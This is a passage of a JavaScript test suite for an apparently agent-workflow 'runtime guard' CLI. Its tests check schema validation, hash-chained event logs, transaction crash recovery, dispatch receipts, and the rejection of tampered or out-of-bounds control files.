    approved_decision_ids: [],
    overall: 'PASS',
    overall_reason: 'all authoritative checks passed',
  });
}

function writeReleaseDecision(task, overrides = {}) {
  const evidenceId = overrides.evidenceId ?? 'EVD-release-decision';
  const value = {
    schema_version: 1,
    workflow_id: task.workflow_id,
    task_id: task.task_id,
    run_id: task.run_id,
    candidate_commit: task.input_commit,
    verdict: 'GO',
    verdict_meaning: 'GO == READY_FOR_OPERATIONS_HANDOFF (not deployed)',
    evaluated_at: '2026-07-29T00:00:20Z',
    commit_matches_review_and_test: true,
    checks: [{
      name: 'candidate integrity',
      status: 'PASS',
      evidence_refs: [evidenceId],
      notes: 'verified',
    }],
    evidence_refs: [evidenceId],
    known_issues: [],
    rollback_plan_present: true,
    ops_handoff_present: true,
    isolation_mode: 'UNSANDBOXED_LOCAL',
    ...overrides,
  };
  delete value.evidenceId;
  writeJson(join(task.artifact_root_abs, 'output', 'release-decision.json'), value);
}

function writeReleaseGate(fixture, { taskId, evidenceId, overall }) {
  const itemStatus = { PASS: 'PASS', FAIL: 'FAIL', HOLD: 'HOLD' }[overall];
  writeJson(join(fixture.workflowDir, 'gates', `release-${overall}.json`), {
    schema_version: 1,
    gate_id: `GATE-Release-${overall}`,
    gate_name: 'ReleaseReadinessGate',
    workflow_id: WORKFLOW_ID,
    task_id: taskId,
    checklist_version: 'gate-checklists v1',
    evaluated_at: '2026-07-29T00:00:30Z',
    items: [{
      item_id: `REL-${overall}`,
      description: 'release decision is authoritative',
      status: itemStatus,
      blocking: true,
      evidence_refs: [evidenceId],
      notes: 'verified',
    }],
    evidence_refs: [evidenceId],
    approved_decision_ids: [],
    overall,
    overall_reason: `release decision requires ${overall}`,
  });
}

function releaseTask(fixture, overrides = {}) {
  return scopedTask(fixture, {
    task_type: 'RELEASE_VERIFICATION',
    assigned_agent: 'release-agent',
    title: 'verify release candidate',
    ...overrides,
  });
}

test('validate-file rejects malformed JSON', () => {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-runtime-guard-json-'));
  try {
    const file = join(root, 'bad.json');
    writeFileSync(file, '{"schema_version": 1,', 'utf8');
    const result = runGuard([
      'validate-file',
      '--project-root', ROOT,
      '--schema', join(ROOT, 'contracts', 'result.schema.json'),
      '--file', file,
    ]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /JSON_PARSE_ERROR/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('validate-file rejects a result missing agent_id', () => {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-runtime-guard-result-'));
  try {
    const file = join(root, 'result.json');
    writeJson(file, {
      schema_version: 1,
      workflow_id: WORKFLOW_ID,
      task_id: TASK_ID,
      run_id: RUN_ID,
      role: 'developer',
      attempt: 1,
      started_at: '2026-07-29T00:00:00Z',
      finished_at: '2026-07-29T00:00:01Z',
      result_status: 'FAILED',
      summary_for_user: 'failed',
      summary_for_manager: 'failed',
      worktree_path_abs: root,
      artifact_root_abs: root,
      isolation_mode: 'UNSANDBOXED_LOCAL',
      self_validation: { preflight_passed: false, checks: [] },
    });
    const result = runGuard([
      'validate-file',
      '--project-root', ROOT,
      '--schema', join(ROOT, 'contracts', 'result.schema.json'),
      '--file', file,
    ]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /agent_id/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('validate-file enforces uniqueItems used by component contracts', () => {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-runtime-guard-unique-'));
  try {
    const file = join(root, 'component-request.json');
    writeJson(file, {
      schema_version: 1,
      request_id: 'CMP-validation',
      decision_id: 'DEC-validation',
      workflow_id: WORKFLOW_ID,
      component_type: 'agent',
      proposed_id: 'validation-agent',
      purpose: 'validate duplicate capabilities',
      capabilities: ['validation.test', 'validation.test'],
      requested_by: 'manager-agent',
      target_agent_id: null,
      model: '',
      retention: 'ask_after_build',
      created_at: '2026-07-29T00:00:00Z',
    });
    const result = runGuard([
      'validate-file',
      '--project-root', ROOT,
      '--schema', join(ROOT, 'contracts', 'component-request.schema.json'),
      '--file', file,
    ]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /SCHEMA_UNIQUE_ITEMS/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('validate-file reports ajv schema errors for invalid enum values', () => {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-runtime-guard-ajv-enum-'));
  try {
    const schemaPath = join(root, 'enum.schema.json');
    const filePath = join(root, 'value.json');
    writeJson(schemaPath, {
      $schema: 'http://json-schema.org/draft-07/schema#',
      type: 'object',
      required: ['status'],
      additionalProperties: false,
      properties: {
        status: { enum: ['PASS', 'FAIL'] },
      },
    });
    writeJson(filePath, { status: 'MAYBE' });

    const result = runGuard(['validate-file', '--schema', schemaPath, '--file', filePath]);

    assert.equal(result.status, 1);
    const payload = JSON.parse(result.stdout);
    assert.equal(payload.ok, false);
    assert.equal(payload.validator, 'ajv');
    assert.equal(payload.errors[0].code, 'SCHEMA_ENUM');
    assert.equal(payload.errors[0].schema_keyword, 'enum');
    assert.equal(payload.errors[0].path, '$.status');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('validate-file writes json validation failures to a jsonl log', () => {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-runtime-guard-validation-log-'));
  try {
    const file = join(root, 'bad.json');
    const logFile = join(root, 'json-validation-errors.jsonl');
    writeFileSync(file, '{"schema_version": 1,', 'utf8');

    const result = runGuard([
      'validate-file',
      '--project-root', ROOT,
      '--schema', join(ROOT, 'contracts', 'result.schema.json'),
      '--file', file,
      '--log-file', logFile,
      '--stage', 'agent_self_validation',
      '--agent-id', 'developer-agent',
      '--workflow-id', WORKFLOW_ID,
      '--task-id', TASK_ID,
      '--run-id', RUN_ID,
      '--attempt', '1',
    ]);

    assert.equal(result.status, 1);
    const records = readFileSync(logFile, 'utf8').trim().split(/\r?\n/u).map((line) => JSON.parse(line));
    assert.equal(records.length, 1);
    assert.equal(records[0].validator, 'ajv');
    assert.equal(records[0].stage, 'agent_self_validation');
    assert.equal(records[0].agent_id, 'developer-agent');
    assert.equal(records[0].workflow_id, WORKFLOW_ID);
    assert.equal(records[0].task_id, TASK_ID);
    assert.equal(records[0].run_id, RUN_ID);
    assert.equal(records[0].attempt, 1);
    assert.equal(records[0].file_path_abs, file);
    assert.equal(records[0].schema_path_abs, join(ROOT, 'contracts', 'result.schema.json'));
    assert.match(records[0].invalid_content_sha256, /^[a-f0-9]{64}$/u);
    assert.match(records[0].invalid_content_excerpt, /\{"schema_version": 1,/u);
    assert.equal(records[0].retry_count, 0);
    assert.equal(records[0].final_status, 'FAILED');
    assert.match(JSON.stringify(records[0].validator_errors), /JSON_PARSE_ERROR/u);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('append-event creates a deterministic first hash', () => {
  const fixture = makeRuntime();
  try {
    const eventsPath = join(fixture.workflowDir, 'new-events.jsonl');
    writeFileSync(eventsPath, '', 'utf8');
    const draftPath = join(fixture.root, 'event-draft.json');
    writeJson(draftPath, {
      event_id: 'EVT-00000000-0000-0000-0000-000000000001',
      timestamp: '2026-07-29T00:00:00Z',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      run_id: null,
      actor: 'manager-agent',
      event_type: 'WORKFLOW_CREATED',
      from_status: null,
      to_status: 'CREATED',
      from_phase: null,
      to_phase: 'INTAKE',
      task_status_before: null,
      task_status_after: null,
      candidate_commit: null,
      payload: {},
    });
    const result = runGuard([
      'append-event',
      '--project-root', ROOT,
      '--events', eventsPath,
      '--event', draftPath,
    ]);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    const event = JSON.parse(readFileSync(eventsPath, 'utf8').trim());
    assert.equal(event.seq, 1);
    assert.equal(event.state_revision, 1);
    assert.equal(event.previous_event_hash, ZERO_HASH);
    assert.equal(event.event_hash, FIRST_EVENT_HASH);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow accepts a historical artifact run with an immutable task-run archive', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const historicalTask = scopedTask(fixture, { run_id: RUN_ID_2 });
    writeTaskResult(historicalTask);
    writeJson(join(fixture.workflowDir, 'task-runs', TASK_ID, `${RUN_ID_2}.json`), {
      schema_version: 1,
      workflow_id: WORKFLOW_ID,
      task_id: TASK_ID,
      run_id: RUN_ID_2,
      archived_at: '2026-07-29T00:00:01Z',
      archived_state_revision: 1,
      task_snapshot_sha256: createHash('sha256').update(JSON.stringify(canonicalizeCodePoints(historicalTask)), 'utf8').digest('hex'),
      task_snapshot: historicalTask,
    });
    const currentTask = scopedTask(fixture);
    appendTaskLifecycle(fixture, currentTask);
    writeTaskResult(currentTask);
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    assert.doesNotMatch(result.stdout, /ORPHAN_ARTIFACT_RUN/);
  } finally { fixture.cleanup(); }
});

test('commit-transition atomically advances event, workflow, and active snapshots', () => {
  const fixture = makeRuntime();
  try {
    const transition = prepareWorkflowTransition(fixture);
    const result = runGuard(transition.args);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    const response = JSON.parse(result.stdout);
    assert.match(response.transaction_id, /^TXN-/u);
    assert.equal(response.state_revision, 2);
    const workflow = JSON.parse(readFileSync(join(fixture.workflowDir, 'workflow.json'), 'utf8'));
    const active = JSON.parse(readFileSync(join(fixture.runtimeRoot, 'control', 'active-workflows.json'), 'utf8'));
    const events = readFileSync(join(fixture.workflowDir, 'events.jsonl'), 'utf8').trim().split(/\r?\n/u).map((line) => JSON.parse(line));
    assert.equal(workflow.state_revision, 2);
    assert.equal(active.workflows[0].state_revision, 2);
    assert.equal(events.length, 2);
    assert.equal(events[1].event_hash, response.event.event_hash);
    const journal = JSON.parse(readFileSync(join(fixture.workflowDir, 'transactions', response.transaction_id, 'transaction.json'), 'utf8'));
    assert.equal(journal.status, 'COMMITTED');
    assert.ok(journal.operations.every((operation) => operation.applied));
  } finally {
    fixture.cleanup();
  }
});

test('commit-transition archives a superseded run before moving the task pointer', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const oldTask = scopedTask(fixture, { status: 'FAILED' });
    const nextTask = scopedTask(fixture, { run_id: RUN_ID_2, status: 'READY', attempt: 2 });
    writeJson(join(fixture.workflowDir, 'tasks', `${TASK_ID}.json`), oldTask);
    const nextTaskDraft = join(fixture.root, 'next-task.json');
    writeJson(nextTaskDraft, nextTask);
    const timestamp = '2026-07-29T00:00:01Z';
    const nextWorkflow = { ...fixture.workflow, state_revision: 2, updated_at: timestamp };
    const nextWorkflowDraft = join(fixture.root, 'next-workflow-task.json');
    writeJson(nextWorkflowDraft, nextWorkflow);
    const nextActive = JSON.parse(readFileSync(join(fixture.runtimeRoot, 'control', 'active-workflows.json'), 'utf8'));
    nextActive.workflows[0].state_revision = 2;
    nextActive.workflows[0].updated_at = timestamp;
    const nextActiveDraft = join(fixture.root, 'next-active-task.json');
    writeJson(nextActiveDraft, nextActive);
    const eventDraft = join(fixture.root, 'next-task-event.json');
    writeJson(eventDraft, {
      event_id: 'EVT-00000000-0000-0000-0000-000000000002', timestamp,
      workflow_id: WORKFLOW_ID, task_id: TASK_ID, run_id: RUN_ID_2,
      actor: 'manager-agent', event_type: 'TASK_READY',
      from_status: 'CREATED', to_status: 'CREATED', from_phase: 'INTAKE', to_phase: 'INTAKE',
      task_status_before: 'CREATED', task_status_after: 'READY', candidate_commit: fixture.currentCandidateCommit, payload: {},
    });
    const result = runGuard([
      'commit-transition', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot,
      '--workflow-id', WORKFLOW_ID, '--event', eventDraft,
      '--next-workflow', nextWorkflowDraft, '--next-active', nextActiveDraft,
      '--next-task', nextTaskDraft, '--expected-revision', '1',
    ]);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    const current = JSON.parse(readFileSync(join(fixture.workflowDir, 'tasks', `${TASK_ID}.json`), 'utf8'));
    const archived = JSON.parse(readFileSync(join(fixture.workflowDir, 'task-runs', TASK_ID, `${RUN_ID}.json`), 'utf8'));
    assert.equal(current.run_id, RUN_ID_2);
    assert.equal(archived.task_snapshot.run_id, RUN_ID);
    assert.equal(archived.task_snapshot.status, 'FAILED');
    const checked = checkWorkflow(fixture);
    assert.equal(checked.status, 0, checked.stdout || checked.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('commit-transition rejects stale state_revision without changing control files', () => {
  const fixture = makeRuntime();
  try {
    const transition = prepareWorkflowTransition(fixture);
    const beforeWorkflow = readFileSync(join(fixture.workflowDir, 'workflow.json'), 'utf8');
    const beforeEvents = readFileSync(join(fixture.workflowDir, 'events.jsonl'), 'utf8');
    const staleArgs = [...transition.args];
    staleArgs[staleArgs.indexOf('--expected-revision') + 1] = '0';
    const result = runGuard(staleArgs);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /STATE_REVISION_CONFLICT/);
    assert.equal(readFileSync(join(fixture.workflowDir, 'workflow.json'), 'utf8'), beforeWorkflow);
    assert.equal(readFileSync(join(fixture.workflowDir, 'events.jsonl'), 'utf8'), beforeEvents);
  } finally {
    fixture.cleanup();
  }
});

test('commit-transition reports malformed next snapshots without a usage error', () => {
  const fixture = makeRuntime();
  try {
    const transition = prepareWorkflowTransition(fixture);
    const malformed = JSON.parse(readFileSync(transition.workflowPath, 'utf8'));
    delete malformed.task_ids;
    writeJson(transition.workflowPath, malformed);
    const result = runGuard(transition.args);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /SCHEMA_REQUIRED/);
    assert.doesNotMatch(result.stdout, /GUARD_USAGE_ERROR/);
  } finally {
    fixture.cleanup();
  }
});

for (const crashPoint of [
  'after-prepared',
  'after-applying',
  'after-operation:event-chain',
  'after-operation:workflow',
  'after-operation:active-index',
  'after-committed',
]) {
  test(`recover-transactions rolls forward a crash at ${crashPoint}`, () => {
    const fixture = makeRuntime();
    try {
      const transition = prepareWorkflowTransition(fixture);
      const crashed = runGuard(transition.args, { env: { RUNTIME_GUARD_TEST_CRASH_AFTER: crashPoint } });
      assert.equal(crashed.status, 86, crashed.stdout || crashed.stderr);
      const recovery = runGuard([
        'recover-transactions',
        '--runtime-root', fixture.runtimeRoot,
        '--workflow-id', WORKFLOW_ID,
      ]);
      assert.equal(recovery.status, 0, recovery.stdout || recovery.stderr);
      const workflow = JSON.parse(readFileSync(join(fixture.workflowDir, 'workflow.json'), 'utf8'));
      const active = JSON.parse(readFileSync(join(fixture.runtimeRoot, 'control', 'active-workflows.json'), 'utf8'));
      const events = readFileSync(join(fixture.workflowDir, 'events.jsonl'), 'utf8').trim().split(/\r?\n/u).map((line) => JSON.parse(line));
      assert.equal(workflow.state_revision, 2);
      assert.equal(active.workflows[0].state_revision, 2);
      assert.equal(events.length, 2);
      const transactionDirs = readdirSync(join(fixture.workflowDir, 'transactions'));
      assert.equal(transactionDirs.length, 1);
      const journal = JSON.parse(readFileSync(join(fixture.workflowDir, 'transactions', transactionDirs[0], 'transaction.json'), 'utf8'));
      assert.equal(journal.status, 'COMMITTED');
    } finally {
      fixture.cleanup();
    }
  });
}

test('recover-transactions rejects a journal target outside the workflow transaction boundary', () => {
  const fixture = makeRuntime();
  try {
    const transition = prepareWorkflowTransition(fixture);
    const crashed = runGuard(transition.args, { env: { RUNTIME_GUARD_TEST_CRASH_AFTER: 'after-prepared' } });
    assert.equal(crashed.status, 86, crashed.stdout || crashed.stderr);
    const transactionId = readdirSync(join(fixture.workflowDir, 'transactions'))[0];
    const journalPath = join(fixture.workflowDir, 'transactions', transactionId, 'transaction.json');
    const journal = JSON.parse(readFileSync(journalPath, 'utf8'));
    const escapedTarget = join(fixture.root, 'escaped-control.json');
    journal.operations[0].target_path_abs = escapedTarget;
    writeJson(journalPath, journal);
    const recovery = runGuard(['recover-transactions', '--runtime-root', fixture.runtimeRoot, '--workflow-id', WORKFLOW_ID]);
    assert.equal(recovery.status, 1);
    assert.match(recovery.stdout, /TRANSACTION_JOURNAL_UNSAFE/);
    assert.equal(existsSync(escapedTarget), false);
  } finally {
    fixture.cleanup();
  }
});

test('dispatch ledger persists intent, session receipts, completion, and validates against the task', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture, { status: 'READY' });
    const prepared = runGuard(prepareDispatchArgs(fixture, task));
    assert.equal(prepared.status, 0, prepared.stdout || prepared.stderr);
    const preparedBody = JSON.parse(prepared.stdout);
    const dispatchId = preparedBody.dispatch_id;
    const repeated = runGuard(prepareDispatchArgs(fixture, task));
    assert.equal(repeated.status, 0, repeated.stdout || repeated.stderr);
    assert.equal(JSON.parse(repeated.stdout).idempotent, true);
    const receiptBase = [
      '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot, '--workflow-id', WORKFLOW_ID,
      '--dispatch-id', dispatchId, '--session-key', preparedBody.intent.session_key, '--session-id', 'session-001',
    ];
    for (const status of ['SENT', 'ACKNOWLEDGED', 'RUNNING']) {
      const receipt = runGuard(['record-dispatch-receipt', ...receiptBase, '--status', status]);
      assert.equal(receipt.status, 0, receipt.stdout || receipt.stderr);
    }
    task.status = 'COMPLETED';
    task.updated_at = '2026-07-29T00:00:04Z';
    writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-dispatch-completion']);
    writeFileSync(join(task.artifact_root_abs, 'output', 'command-records.jsonl'), `${JSON.stringify({
      command_record_id: 'CMD-dispatch-completion',
      executable: 'node',
      cwd_abs: task.worktree_path_abs,
      started_at: '2026-07-29T00:00:00Z',
      finished_at: '2026-07-29T00:00:01Z',
      exit_code: 0,
      timed_out: false,
      stdout_path_abs: join(task.artifact_root_abs, 'raw-logs', 'stdout.log'),
      stderr_path_abs: join(task.artifact_root_abs, 'raw-logs', 'stderr.log'),
      attempt: task.attempt,
      invoked_by_agent: task.assigned_agent,
      task_id: task.task_id,
      run_id: task.run_id,
      isolation_mode: 'UNSANDBOXED_LOCAL',
    })}\n`, 'utf8');
    const completion = runGuard([
      'record-completion-receipt', ...receiptBase, '--status', 'SUCCEEDED',
      '--result-file', join(task.artifact_root_abs, 'output', 'result.json'),
    ]);
    assert.equal(completion.status, 0, completion.stdout || completion.stderr);
    appendTaskLifecycle(fixture, task);
    const reconciled = runGuard(['reconcile-dispatch', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot, '--workflow-id', WORKFLOW_ID, '--dispatch-id', dispatchId]);
    assert.equal(reconciled.status, 0, reconciled.stdout || reconciled.stderr);
    assert.equal(JSON.parse(reconciled.stdout).dispatches[0].state, 'SUCCEEDED');
    const checked = checkWorkflow(fixture);
    assert.equal(checked.status, 0, checked.stdout || checked.stderr);
    const receiptsPath = join(fixture.workflowDir, 'dispatch', dispatchId, 'receipts.jsonl');
    const receipts = readFileSync(receiptsPath, 'utf8').trim().split(/\r?\n/u).map((line) => JSON.parse(line));
    receipts[1].session_id = 'session-tampered';
    writeFileSync(receiptsPath, `${receipts.map((receipt) => JSON.stringify(receipt)).join('\n')}\n`, 'utf8');
    const tampered = checkWorkflow(fixture);
    assert.equal(tampered.status, 1);
    assert.match(tampered.stdout, /DISPATCH_SESSION_ID_MISMATCH|DISPATCH_COMPLETION_SESSION_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('prepare-dispatch serializes one task/run while allowing a different task', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID, TASK_ID_2], withCurrentCandidate: true });
  try {
    const firstTask = scopedTask(fixture, { status: 'READY' });
    const secondTask = scopedTask(fixture, { task_id: TASK_ID_2, run_id: RUN_ID_2, status: 'READY' });
    const first = runGuard(prepareDispatchArgs(fixture, firstTask));
    assert.equal(first.status, 0, first.stdout || first.stderr);
    const second = runGuard(prepareDispatchArgs(fixture, secondTask));
    assert.equal(second.status, 0, second.stdout || second.stderr);
    firstTask.attempt = 2;
    writeJson(join(fixture.workflowDir, 'tasks', `${firstTask.task_id}.json`), firstTask);
    const conflict = runGuard(prepareDispatchArgs(fixture, firstTask, 'session-key:retry'));
    assert.equal(conflict.status, 1);
    assert.match(conflict.stdout, /DISPATCH_SCOPE_CONFLICT/);
  } finally {
    fixture.cleanup();
  }
});

test('failed dispatch can enter dead letter only after its retry budget is exhausted', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture, { status: 'READY', attempt: 2, max_attempts: 2 });
    const prepared = runGuard([...prepareDispatchArgs(fixture, task), '--retry-count', '1', '--max-retries', '1']);
    assert.equal(prepared.status, 0, prepared.stdout || prepared.stderr);
    const body = JSON.parse(prepared.stdout);
    const common = [
      '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot, '--workflow-id', WORKFLOW_ID,
      '--dispatch-id', body.dispatch_id, '--session-key', body.intent.session_key, '--session-id', 'session-lost',
    ];
    const sent = runGuard(['record-dispatch-receipt', ...common, '--status', 'SENT']);
    assert.equal(sent.status, 0, sent.stdout || sent.stderr);
    const lost = runGuard(['record-completion-receipt', ...common, '--status', 'LOST', '--error-code', 'SESSION_TIMEOUT', '--error-message', 'session lease expired']);
    assert.equal(lost.status, 0, lost.stdout || lost.stderr);
    const dead = runGuard([
      'dead-letter-dispatch', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot,
      '--workflow-id', WORKFLOW_ID, '--dispatch-id', body.dispatch_id,
      '--reason', 'retry budget exhausted', '--last-error', 'SESSION_TIMEOUT',
    ]);
    assert.equal(dead.status, 0, dead.stdout || dead.stderr);
    const reconciled = runGuard(['reconcile-dispatch', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot, '--workflow-id', WORKFLOW_ID, '--dispatch-id', body.dispatch_id]);
    assert.equal(JSON.parse(reconciled.stdout).dispatches[0].state, 'DEAD_LETTER');
  } finally {
    fixture.cleanup();
  }
});

test('reconcile-dispatch reports an expired lease and requires session lookup before retry', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture, { status: 'READY' });
    const prepared = runGuard(prepareDispatchArgs(fixture, task));
    assert.equal(prepared.status, 0, prepared.stdout || prepared.stderr);
    const body = JSON.parse(prepared.stdout);
    const intentPath = join(fixture.workflowDir, 'dispatch', body.dispatch_id, 'intent.json');
    const intent = JSON.parse(readFileSync(intentPath, 'utf8'));
    intent.created_at = '2000-01-01T00:00:00Z';
    intent.lease_started_at = '2000-01-01T00:00:00Z';
    intent.lease_deadline = '2000-01-01T00:15:00Z';
    writeJson(intentPath, intent);
    const reconciled = runGuard(['reconcile-dispatch', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot, '--workflow-id', WORKFLOW_ID, '--dispatch-id', body.dispatch_id]);
    assert.equal(reconciled.status, 0, reconciled.stdout || reconciled.stderr);
    const dispatch = JSON.parse(reconciled.stdout).dispatches[0];
    assert.equal(dispatch.lease_expired, true);
    assert.equal(dispatch.action_required, 'QUERY_SESSION_BEFORE_RETRY');
    appendTaskLifecycle(fixture, task, 'READY');
    const checked = checkWorkflow(fixture);
    assert.equal(checked.status, 1);
    assert.match(checked.stdout, /DISPATCH_LEASE_EXPIRED/);
  } finally {
    fixture.cleanup();
  }
});

test('append-event canonicalizes object keys by Unicode code point', () => {
  const fixture = makeRuntime();
  try {
    const eventsPath = join(fixture.workflowDir, 'unicode-events.jsonl');
    const draftPath = join(fixture.root, 'unicode-event-draft.json');
    writeJson(draftPath, {
      event_id: 'EVT-00000000-0000-0000-0000-000000000001',
      timestamp: '2026-07-29T00:00:00Z',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      run_id: null,
      actor: 'manager-agent',
      event_type: 'WORKFLOW_CREATED',
      from_status: null,
      to_status: 'CREATED',
      from_phase: null,
      to_phase: 'INTAKE',
      task_status_before: null,
      task_status_after: null,
      candidate_commit: null,
      payload: { '\u{10000}': 'supplementary', '\uE000': 'bmp' },
    });
    const result = runGuard([
      'append-event',
      '--project-root', ROOT,
      '--events', eventsPath,
      '--event', draftPath,
    ]);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    const event = JSON.parse(readFileSync(eventsPath, 'utf8').trim());
    const { event_hash: ignored, ...unsigned } = event;
    const expectedHash = createHash('sha256')
      .update(JSON.stringify(canonicalizeCodePoints(unsigned)), 'utf8')
      .digest('hex');
    assert.equal(event.event_hash, expectedHash);
  } finally {
    fixture.cleanup();
  }
});

test('append-event canonicalizes numeric-looking object keys lexically, including nested keys', () => {
  const fixture = makeRuntime();
  try {
    const eventsPath = join(fixture.workflowDir, 'numeric-key-events.jsonl');
    const draftPath = join(fixture.root, 'numeric-key-event-draft.json');
    writeJson(draftPath, {
      event_id: 'EVT-00000000-0000-0000-0000-000000000001',
      timestamp: '2026-07-29T00:00:00Z',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      run_id: null,
      actor: 'manager-agent',
      event_type: 'WORKFLOW_CREATED',
      from_status: null,
      to_status: 'CREATED',
      from_phase: null,
      to_phase: 'INTAKE',
      task_status_before: null,
      task_status_after: null,
      candidate_commit: null,
      payload: {
        2: 'two',
        10: 'ten',
        nested: { 2: 'nested-two', 10: 'nested-ten' },
      },
    });
    assert.equal(
      createHash('sha256').update(NUMERIC_KEY_CANONICAL, 'utf8').digest('hex'),
      NUMERIC_KEY_EVENT_HASH,
    );
    const result = runGuard([
      'append-event',
      '--project-root', ROOT,
      '--events', eventsPath,
      '--event', draftPath,
    ]);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    const event = JSON.parse(readFileSync(eventsPath, 'utf8').trim());
    assert.equal(event.event_hash, NUMERIC_KEY_EVENT_HASH);
  } finally {
    fixture.cleanup();
  }
});

test('append-event refuses to extend a tampered event chain', () => {
  const fixture = makeRuntime();
  try {
    const eventsPath = join(fixture.workflowDir, 'events.jsonl');
    const first = JSON.parse(readFileSync(eventsPath, 'utf8').trim());
    first.event_hash = 'f'.repeat(64);
    writeFileSync(eventsPath, `${JSON.stringify(first)}\n`, 'utf8');
    const draftPath = join(fixture.root, 'event-draft.json');
    writeJson(draftPath, {
      event_id: 'EVT-00000000-0000-0000-0000-000000000002',
      timestamp: '2026-07-29T00:00:01Z',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      run_id: null,
      actor: 'manager-agent',
      event_type: 'PHASE_ADVANCED',
      from_status: 'CREATED',
      to_status: 'ANALYZING_REQUIREMENTS',
      from_phase: 'INTAKE',
      to_phase: 'REQUIREMENTS',
      task_status_before: null,
      task_status_after: null,
      candidate_commit: null,
      payload: {},
    });
    const result = runGuard([
      'append-event',
      '--project-root', ROOT,
      '--events', eventsPath,
      '--event', draftPath,
    ]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /EVENT_HASH_MISMATCH/);
    assert.equal(readFileSync(eventsPath, 'utf8').trim(), JSON.stringify(first));
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects an invalid workflow transition', () => {
  const first = signedEvent({
    seq: 1,
    event_type: 'WORKFLOW_CREATED',
    to_status: 'CREATED',
    to_phase: 'INTAKE',
  });
  const second = signedEvent({
    seq: 2,
    event_type: 'PHASE_ADVANCED',
    from_status: 'CREATED',
    to_status: 'TESTING',
    from_phase: 'INTAKE',
    to_phase: 'TESTING',
    previous_event_hash: first.event_hash,
  });
  const fixture = makeRuntime({
    status: 'TESTING',
    phase: 'TESTING',
    revision: 2,
    events: [first, second],
  });
  try {
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /INVALID_WORKFLOW_TRANSITION/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects active index revision drift', () => {
  const fixture = makeRuntime();
  try {
    const activePath = join(fixture.runtimeRoot, 'control', 'active-workflows.json');
    const active = JSON.parse(readFileSync(activePath, 'utf8'));
    active.workflows[0].state_revision = 2;
    writeJson(activePath, active);
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /ACTIVE_WORKFLOW_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow accepts a terminal workflow removed from the active index with a final report', () => {
  const fixture = makeRuntime({
    status: 'READY_FOR_OPERATIONS_HANDOFF',
    phase: 'FINAL_REPORT',
  });
  try {
    clearActiveWorkflows(fixture);
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), '# Final report\n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow accepts a quarantined workflow only with its evidence report', () => {
  const fixture = makeRuntime({ status: 'QUARANTINED', phase: 'INTAKE', taskIds: [TASK_ID] });
  try {
    clearActiveWorkflows(fixture);
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), 'workflow quarantined\n', 'utf8');
    let result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /QUARANTINE_REPORT_REQUIRED/);
    writeFileSync(join(fixture.workflowDir, 'quarantine-report.md'), 'original artifacts retained\n', 'utf8');
    result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout);
    assert.match(result.stdout, /"quarantined": true/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects a terminal workflow that remains in the active index', () => {
  const fixture = makeRuntime({
    status: 'READY_FOR_OPERATIONS_HANDOFF',
    phase: 'FINAL_REPORT',
  });
  try {
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), '# Final report\n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /TERMINAL_ACTIVE_WORKFLOW_ENTRY/);
  } finally {
    fixture.cleanup();
  }
});

